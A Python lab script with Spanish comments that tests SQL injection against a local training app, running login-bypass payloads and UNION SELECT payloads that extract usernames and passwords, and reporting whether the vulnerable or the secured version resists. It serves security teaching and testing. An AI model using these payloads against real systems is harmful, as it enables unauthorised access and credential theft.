"""
Script de prueba controlada de Inyección SQL contra el laboratorio local
(Aegis Corp). Ejecuta dos ataques y verifica el resultado:

  FASE 1 · Bypass de autenticación (login).
  FASE 2 · Extracción de credenciales con UNION (buscador de empleados).

  - Contra app_vulnerable.py (puerto 5000)  -> ambos ataques DEBEN tener éxito.
  - Contra app_seguro.py     (puerto 5001)  -> ambos ataques DEBEN fallar.

Uso EXCLUSIVO contra el laboratorio propio en 127.0.0.1. No ejecutar
contra sistemas de terceros sin autorización expresa.

Ejecución:
    python app_vulnerable.py        # terminal 1
    python ataque_sql_i.py          # terminal 2  (prueba el puerto 5000)

    # Para probar la versión segura:
    python app_seguro.py            # terminal 1
    python ataque_sql_i.py http://127.0.0.1:5001/
"""

import sys
import requests

# La URL objetivo puede pasarse como argumento; por defecto, la app vulnerable.
URL = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5000/"
TIMEOUT = 5

# Señales de éxito.
SENIAL_PANEL = "Panel Confidencial"   # el bypass de login lleva al panel
SENIAL_CLAVE = "Secreto123"           # contraseña en claro filtrada por UNION

# ----- FASE 1: payloads de bypass de autenticación -----
PAYLOADS_LOGIN = [
    ("admin", "' OR '1'='1"),
    ("admin'--", "cualquier_cosa"),
    ("' OR 1=1--", "x"),
    ("' OR '1'='1' --", "x"),
    ("admin' OR '1'='1' LIMIT 1--", "x"),
]

# ----- FASE 2: payloads UNION para extraer la tabla 'usuarios' -----
PAYLOADS_UNION = [
    "' UNION SELECT username, password, rol FROM usuarios--",
    "x' UNION SELECT username, password, rol FROM usuarios--",
]


def _post(datos):
    """Envía un POST al laboratorio; aborta si no hay conexión."""
    try:
        return requests.post(URL, data=datos, timeout=TIMEOUT, allow_redirects=True)
    except requests.exceptions.ConnectionError:
        print(f"  [!] No se pudo conectar a {URL}")
        print("      ¿Está corriendo el servidor del laboratorio?")
        sys.exit(1)


def intentar_login(usuario, clave):
    """True si el intento de login llega al panel (bypass exitoso)."""
    r = _post({"username": usuario, "password": clave, "login_btn": "1"})
    return SENIAL_PANEL in r.text


def intentar_union(payload):
    """True si la respuesta del buscador contiene credenciales filtradas."""
    r = _post({"termino": payload, "buscar_btn": "1"})
    return SENIAL_CLAVE in r.text


def fase_login():
    print("\n" + "-" * 64)
    print("  FASE 1 · Bypass de autenticación")
    print("-" * 64)
    exitos = 0
    for i, (usuario, clave) in enumerate(PAYLOADS_LOGIN, 1):
        ok = intentar_login(usuario, clave)
        exitos += ok
        estado = "ACCESO CONCEDIDO" if ok else "acceso denegado"
        print(f"  [{i}/{len(PAYLOADS_LOGIN)}] username={usuario!r:<32} -> {estado}")
    print(f"  Resultado: {exitos}/{len(PAYLOADS_LOGIN)} bypass logrados.")
    return exitos


def fase_union():
    print("\n" + "-" * 64)
    print("  FASE 2 · Extracción de credenciales con UNION")
    print("-" * 64)
    exitos = 0
    for i, payload in enumerate(PAYLOADS_UNION, 1):
        ok = intentar_union(payload)
        exitos += ok
        estado = "CREDENCIALES FILTRADAS" if ok else "sin fuga de datos"
        print(f"  [{i}/{len(PAYLOADS_UNION)}] {payload[:46]:<46} -> {estado}")
    print(f"  Resultado: {exitos}/{len(PAYLOADS_UNION)} extracciones logradas.")
    return exitos


def main():
    print("=" * 64)
    print("  LABORATORIO SQLi  -  Pruebas controladas de inyección")
    print(f"  Objetivo: {URL}")
    print("=" * 64)

    total = fase_login() + fase_union()

    print("\n" + "=" * 64)
    if total:
        print("  CONCLUSIÓN: la aplicación es VULNERABLE a inyección SQL.")
    else:
        print("  CONCLUSIÓN: la aplicación resistió los ataques (versión segura).")
    print("=" * 64)


if __name__ == "__main__":
    main()
